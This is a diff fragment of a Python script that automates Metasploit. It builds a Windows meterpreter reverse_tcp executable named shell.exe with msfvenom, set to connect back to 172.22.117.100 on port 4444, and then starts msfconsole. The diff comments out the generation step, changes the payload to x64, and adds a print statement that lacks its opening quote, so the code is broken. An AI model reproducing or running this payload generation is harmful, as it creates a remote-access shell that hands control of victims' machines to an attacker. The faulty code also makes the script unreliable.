@@ -8,9 +8,10 @@ print ("INITIALISING")
 print ("WELCOME")
 
 #msfvenom
-process = pexpect.spawn('msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe') 
-process.expect('Final')
-print ("MSFVENOM SCRIPT COMPLETE. NAME=shell.exe")
+#process = pexpect.spawn('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe') 
+#process.expect('Final')
+#print ("MSFVENOM SCRIPT COMPLETE. NAME=shell.exe")
+print (MSFVENOM SCRIPT ALREADY EXISTS")
 
 # Start Metasploit
 msf_script = pexpect.spawn('msfconsole', encoding='utf-8')
